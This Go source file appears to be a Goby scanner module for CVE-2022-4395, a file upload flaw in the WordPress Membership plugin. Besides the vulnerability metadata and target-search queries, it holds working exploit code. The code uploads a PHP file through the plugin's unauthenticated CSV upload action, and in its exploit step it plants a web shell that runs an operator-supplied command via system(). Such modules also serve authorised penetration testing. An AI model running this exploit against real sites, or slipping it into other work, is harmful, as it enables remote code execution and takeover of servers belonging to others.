package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin Membership wps_membership_csv_file_upload File Upload Vulnerability (CVE-2022-4395)",
    "Description": "<p>WordPress plugin Membership is a plugin that helps attract customers using membership programs, offers users membership programs as subscriptions to limit access to your eCommerce store.</p><p>WordPress plugin Membership versions before 2.1.7 have a code problem vulnerability, which is caused by not verifying uploaded files. Attackers exploit this vulnerability to upload arbitrary files, such as malicious PHP code, and execute code remotely.</p>",
    "Product": "wordpress-plugin-membership",
    "Homepage": "https://wordpress.org/plugins/membership-for-woocommerce/",
    "DisclosureDate": "2023-02-01",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"wp-content/plugins/Membership\" ",
    "GobyQuery": "body=\"wp-content/plugins/Membership\" ",
    "Level": "2",
    "Impact": "<p>WordPress plugin Membership versions before 2.1.7 have a code problem vulnerability, which is caused by not verifying uploaded files. Attackers exploit this vulnerability to upload arbitrary files, such as malicious PHP code, and execute code remotely.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/membership-for-woocommerce/.\">https://wordpress.org/plugins/membership-for-woocommerce/.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/80407ac4-8ce3-4df7-9c41-007b69045c40"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2022-4395"
    ],
    "CNNVD": [
        "CNNVD-202301-2321"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "WordPress Membership 插件 wps_membership_csv_file_upload 文件上传漏洞（CVE-2022-4395）",
            "Product": "wordpress-plugin-membership",
            "Description": "<p>WordPress plugin Membership 是一款帮助使用会员资格计划吸引客户，向用户提供会员计划作为订阅，以限制访问您的电子商务商店的插件。<br></p><p>WordPress plugin Membership 2.1.7之前版本存在代码问题漏洞，该漏洞源于不验证上传的文件。攻击者利用该漏洞上传任意文件，如恶意PHP代码，并远程执行代码。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/membership-for-woocommerce/\">https://wordpress.org/plugins/membership-for-woocommerce/</a>。<br></p>",
            "Impact": "<p>WordPress plugin Membership 2.1.7之前版本存在代码问题漏洞，该漏洞源于不验证上传的文件。攻击者利用该漏洞上传任意文件，如恶意PHP代码，并远程执行代码。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress plugin Membership wps_membership_csv_file_upload File Upload Vulnerability (CVE-2022-4395)",
            "Product": "wordpress-plugin-membership",
            "Description": "<p>WordPress plugin Membership is a plugin that helps attract customers using membership programs, offers users membership programs as subscriptions to limit access to your eCommerce store.<br></p><p>WordPress plugin Membership versions before 2.1.7 have a code problem vulnerability, which is caused by not verifying uploaded files. Attackers exploit this vulnerability to upload arbitrary files, such as malicious PHP code, and execute code remotely.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/membership-for-woocommerce/.\">https://wordpress.org/plugins/membership-for-woocommerce/.</a><br></p>",
            "Impact": "<p>WordPress plugin Membership versions before 2.1.7 have a code problem vulnerability, which is caused by not verifying uploaded files. Attackers exploit this vulnerability to upload arbitrary files, such as malicious PHP code, and execute code remotely.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10800"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------fd13967f633f4335")
			cfg.Data = "--------------------------fd13967f633f4335\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.php\"\r\nContent-Type: text/csv\r\n\r\n<?php echo md5(233);unlink(__FILE__);?>\r\n--------------------------fd13967f633f4335--\r\n"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {

				uri2 := "/wp-content/uploads/mfw-activity-logger/csv-uploads/payload.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")

				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------fd13967f633f4335")
			cfg.Data = fmt.Sprintf("--------------------------fd13967f633f4335\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.php\"\r\nContent-Type: text/csv\r\n\r\n<?php system('%s');?>\r\n--------------------------fd13967f633f4335--\r\n",cmd)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {

				uri2 := "/wp-content/uploads/mfw-activity-logger/csv-uploads/payload.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = resp2.RawBody
					expResult.Success = true

				}

			}
			return expResult
		},
	))
}
